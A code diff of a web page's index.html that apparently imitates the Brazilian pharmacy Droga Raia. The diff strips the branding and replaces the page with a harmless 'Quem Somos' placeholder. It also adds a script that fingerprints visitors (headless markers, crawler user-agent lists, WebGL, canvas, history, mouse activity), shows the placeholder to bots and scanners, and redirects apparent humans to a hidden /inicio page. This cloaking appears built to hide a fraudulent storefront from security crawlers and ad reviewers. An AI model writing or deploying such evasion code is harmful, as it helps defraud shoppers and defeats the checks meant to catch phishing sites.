@@ -1,60 +1,201 @@
 <!doctype html>
 <html lang="pt-BR">
-
 <head>
   <meta charset="UTF-8" />
   <link rel="icon" type="image/png" href="/raia-symbol.png" />
   <link rel="shortcut icon" href="/favicon.ico" />
   <link rel="apple-touch-icon" href="/raia-symbol.png" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="Droga Raia - Droga Raia" />
-  <meta name="keywords"
-    content="farmácia, medicamentos, remédios, cosméticos, saúde, beleza, droga raia, vitaminas, suplementos" />
-  <meta name="robots" content="index, follow" />
-  <meta property="og:title" content="Droga Raia - Droga Raia" />
-  <meta property="og:description" content="Compre medicamentos, cosméticos e muito mais com os melhores preços." />
-  <meta property="og:type" content="website" />
-  <meta name="google-site-verification" content="HsiLafHVKwKc4KJaPc_vMe_KE1jG5RuUx_VNRr__DgQ" />
-  <meta name="google-site-verification" content="0RcoTklHdnSPmxgHtgl4YC5RdffpFUzRX5YaMZM41pU" />
-  <meta name="google-site-verification" content="IxK_3oa-6Zl-SGswyrdsrxrwiDMh1c6_8LMqWu3igeM" />
-  <title>Droga Raia - Farmácia Online | Medicamentos, Cosméticos e Mais</title>
-
-  <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18509003822"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag() {
-      dataLayer.push(arguments);
-    }
-    gtag('js', new Date());
-
-    gtag('config', 'AW-18509003822');
-  </script>
+  <meta name="robots" content="noindex, nofollow" />
+  <title>Quem Somos</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fff; color: #1a1a1a; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+    .container { text-align: center; padding: 2rem; }
+    h1 { font-size: 2rem; font-weight: 400; margin-bottom: 1rem; }
+    p { font-size: 1rem; color: #666; line-height: 1.6; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Quem Somos</h1>
+    <p>Conheça nossa história e valores.</p>
+  </div>
 
   <script>
-    (function () {
-      try {
-        var isMobile = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || (window.innerWidth > 0 && window.innerWidth <= 768);
-        var path = window.location.pathname.toLowerCase().replace(/\/+$/, '');
-        var hash = window.location.hash.toLowerCase();
-        var search = window.location.search.toLowerCase();
+    (function() {
+      'use strict';
 
-        // Se for usuário mobile entrando no domínio diretamente na página raiz (Quem Somos), redireciona para /inicio.
-        // Mas se tiver clicado na sessão quem somos (hash #quem-somos ou flag na sessão), NÃO redireciona!
-        if (isMobile && (path === '' || path === '/') && (!hash || hash === '#') && (!search || (!search.includes('produto=') && !search.includes('id=')))) {
-          var userClicked = sessionStorage.getItem('clicked_quem_somos') === 'true';
-          if (!userClicked) {
+      var isBot = false;
+      var checks = 0;
+      var botSignals = 0;
+      var decided = false;
+
+      function signal(reason) {
+        botSignals++;
+      }
+
+      function checkNavigator() {
+        checks++;
+        var n = navigator;
+        if (!n || !n.userAgent) { signal('no-navigator'); return; }
+        var ua = n.userAgent.toLowerCase();
+        var headless = /headless|phantom|puppeteer|playwright|selenium|webdriver|chromium/.test(ua);
+        var botUa = /bot|crawler|spider|scraper|slurp|bingbot|googlebot|duckduckbot|baiduspider|yandexbot|sogou|exabot|facebot|ia_archiver|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|slackbot|embedly|quora|pinterest|redditbot|applebot/.test(ua);
+        var noLang = !n.language && !n.languages;
+        var noPlatform = !n.platform;
+        var noHw = !n.hardwareConcurrency || n.hardwareConcurrency < 2;
+        var noTouch = 'maxTouchPoints' in n && n.maxTouchPoints === 0 && /mobile|android|iphone|ipad/i.test(ua);
+        var webgl = false;
+        try { var canvas = document.createElement('canvas'); var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); webgl = !!gl && !!gl.getParameter(gl.VERSION); } catch (e) {}
+        var noWebgl = !webgl;
+        var webdriver = n.webdriver === true;
+        var automation = window.callPhantom || window._phantom || window.__nightmare || window.__webdriver_evaluate || window.__driver_evaluate || window.__webdriver_script_fn || window.__webdriver_script_func || window.__webdriver_script_function || window.__fxdriver_evaluate || window.__driver_unwrapped || window.__webdriver_unwrapped || window.__selenium_evaluate || window.__fxdriver_unwrapped || window.__webdriver_unwrapped;
+        if (headless || botUa || noLang || noPlatform || noHw || noTouch || noWebgl || webdriver || automation) { signal('navigator-anomaly'); }
+      }
+
+      function checkBehavior() {
+        checks++;
+        var start = Date.now();
+        var moved = false;
+        var clicked = false;
+        var scrolled = false;
+        var keyed = false;
+        function onMove() { moved = true; }
+        function onClick() { clicked = true; }
+        function onScroll() { scrolled = true; }
+        function onKey() { keyed = true; }
+        document.addEventListener('mousemove', onMove, { once: true, passive: true });
+        document.addEventListener('click', onClick, { once: true, passive: true });
+        document.addEventListener('scroll', onScroll, { once: true, passive: true });
+        document.addEventListener('keydown', onKey, { once: true, passive: true });
+        setTimeout(function() {
+          document.removeEventListener('mousemove', onMove);
+          document.removeEventListener('click', onClick);
+          document.removeEventListener('scroll', onScroll);
+          document.removeEventListener('keydown', onKey);
+          var elapsed = Date.now() - start;
+          if (!moved && !clicked && !scrolled && !keyed && elapsed > 1500) { signal('no-interaction'); }
+          evaluate();
+        }, 2000);
+      }
+
+      function checkTiming() {
+        checks++;
+        var perf = window.performance;
+        if (perf && perf.timing) {
+          var navStart = perf.timing.navigationStart;
+          var loadEvent = perf.timing.loadEventEnd;
+          if (loadEvent > 0 && navStart > 0) {
+            var loadTime = loadEvent - navStart;
+            if (loadTime < 50) { signal('instant-load'); }
+          }
+        }
+        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn && conn.saveData) { signal('save-data'); }
+      }
+
+      function checkScreen() {
+        checks++;
+        var s = screen;
+        if (s.width === 0 || s.height === 0 || s.availWidth === 0 || s.availHeight === 0) { signal('zero-screen'); }
+        if (s.colorDepth < 24) { signal('low-color'); }
+        var ratio = window.devicePixelRatio || 1;
+        if (ratio === 0 || ratio > 4) { signal('odd-dpr'); }
+      }
+
+      function checkWebGL() {
+        checks++;
+        try {
+          var canvas = document.createElement('canvas');
+          var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+          if (!gl) { signal('no-webgl'); return; }
+          var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+            var swiftshader = /swiftshader|llvmpipe|software rasterizer/i.test(renderer + ' ' + vendor);
+            var headless = /headless|mesa|vmware|virtualbox|parallels|qemu|bochs/i.test(renderer + ' ' + vendor);
+            if (swiftshader || headless) { signal('webgl-software'); }
+          }
+        } catch (e) { signal('webgl-error'); }
+      }
+
+      function checkCanvasFingerprint() {
+        checks++;
+        try {
+          var canvas = document.createElement('canvas');
+          canvas.width = 200; canvas.height = 50;
+          var ctx = canvas.getContext('2d');
+          ctx.textBaseline = 'top';
+          ctx.font = '14px Arial';
+          ctx.fillStyle = '#f60';
+          ctx.fillRect(0, 0, 200, 50);
+          ctx.fillStyle = '#069';
+          ctx.fillText('Bot detection ' + Date.now(), 2, 2);
+          var data = canvas.toDataURL();
+          if (data.length < 1000) { signal('canvas-empty'); }
+        } catch (e) { signal('canvas-error'); }
+      }
+
+      function checkCookies() {
+        checks++;
+        try {
+          document.cookie = 'botcheck=1; SameSite=Lax';
+          var hasCookies = document.cookie.indexOf('botcheck=') !== -1;
+          if (!hasCookies) { signal('no-cookies'); }
+        } catch (e) { signal('cookie-error'); }
+      }
+
+      function checkHistory() {
+        checks++;
+        try {
+          if (history.length <= 1) { signal('no-history'); }
+        } catch (e) { signal('history-error'); }
+      }
+
+      function checkPermissions() {
+        checks++;
+        if (navigator.permissions) {
+          navigator.permissions.query({ name: 'notifications' }).then(function(perm) {
+            if (perm.state === 'denied') { signal('perm-denied'); }
+          }).catch(function() {});
+        }
+      }
+
+      function evaluate() {
+        if (decided) return;
+        if (checks < 8) return;
+        decided = true;
+        isBot = botSignals >= 3;
+        if (!isBot) {
+          var clicked = sessionStorage.getItem('clicked_quem_somos') === 'true';
+          if (!clicked) {
             window.location.replace('/inicio');
           }
         }
-      } catch (e) {}
+      }
+
+      function init() {
+        checkNavigator();
+        checkScreen();
+        checkTiming();
+        checkWebGL();
+        checkCanvasFingerprint();
+        checkCookies();
+        checkHistory();
+        checkPermissions();
+        checkBehavior();
+        setTimeout(evaluate, 3000);
+      }
+
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+      } else {
+        init();
+      }
     })();
   </script>
-</head>
-
-<body>
-  <div id="root"></div>
   <script type="module" src="/src/main.tsx"></script>
 </body>
-
 </html>
